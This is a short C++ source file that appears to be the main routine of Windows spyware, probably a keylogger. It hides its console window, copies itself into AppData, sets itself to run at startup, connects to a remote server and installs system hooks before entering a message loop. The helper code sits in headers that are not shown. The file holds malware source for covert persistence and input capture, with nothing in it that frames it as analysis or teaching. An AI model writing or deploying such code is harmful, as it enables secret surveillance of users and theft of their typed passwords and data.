#include "connection.h"
#include "hooks.h"
#include <windows.h>
#include <iostream>
#include <string>
#include <cstdlib>  
#include "persistence.h"

using namespace std;

 int main() {
    SetConsoleCtrlHandler(ConsoleHandler, TRUE);
    HideConsole();
    CopyToAppdata();
    RunAtStartup();

    if (!clientConnection()) {
        cerr << "Failed to connect to server.\n";
        return 1;
    }

    if (!installHooks()) {
        cerr<< "Failed to install hooks.\n";
        cleanupConnection();
        return 1;
    }

    cout << "Hooks installed.\n";

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    uninstallHooks();
    cleanupConnection();
    return 0;
}
